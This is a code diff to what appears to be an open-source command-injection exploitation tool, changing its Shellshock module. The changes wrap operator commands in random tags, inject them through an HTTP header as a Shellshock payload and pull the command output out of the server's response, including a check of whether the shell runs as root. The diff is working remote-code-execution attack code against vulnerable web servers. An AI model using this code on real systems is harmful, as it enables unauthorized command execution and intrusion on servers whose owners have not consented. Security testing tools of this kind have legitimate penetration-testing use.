@@ -3,6 +3,8 @@
 import re
 import os
 import sys
+import string
+import random
 import urllib2
 
 from src.utils import menu
@@ -138,7 +140,8 @@ def enumeration(url, cve, check_header, filename):
     cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if cu_account:
       if menu.options.is_root:
-        cmd = settings.IS_ROOT
+        cmd = re.findall(r"" + "\$(.*)", settings.IS_ROOT)
+        cmd = ''.join(cmd).replace("(","").replace(")","")
         shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if settings.VERBOSITY_LEVEL >= 1:
           print ""
@@ -151,7 +154,7 @@ def enumeration(url, cve, check_header, filename):
         output_file.close()
         if shell:
           if shell != "0":
-              sys.stdout.write(Style.BRIGHT + " and it is " +  "not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
+              sys.stdout.write(Style.BRIGHT + " and it is" +  " not" + Style.RESET_ALL + Style.BRIGHT + " privileged" + Style.RESET_ALL + ".\n")
               sys.stdout.flush()
               # Add infos to logs file.   
               output_file = open(filename, "a")
@@ -761,17 +764,21 @@ def shellshock_handler(url, http_request_method, filename):
 Execute user commands
 """
 def cmd_exec(url, cmd, cve, check_header, filename):
-
+ 
   """
   Check for shellshock 'shell'
   """
   def check_for_shell(url, cmd, cve, check_header, filename):
     try:
+      TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
+      cmd = "echo " + TAG + "$(" + cmd + ")" + TAG
       payload = shellshock_exploitation(cve, cmd)
       header = { check_header : payload }
       request = urllib2.Request(url, None, header)
       response = urllib2.urlopen(request)
-      shell = response.read().rstrip()
+      shell = response.read().rstrip().replace('\n',' ')
+      shell = re.findall(r"" + TAG + "(.*)" + TAG, shell)
+      shell = ''.join(shell)
       return shell, payload
 
     except urllib2.URLError, err_msg:
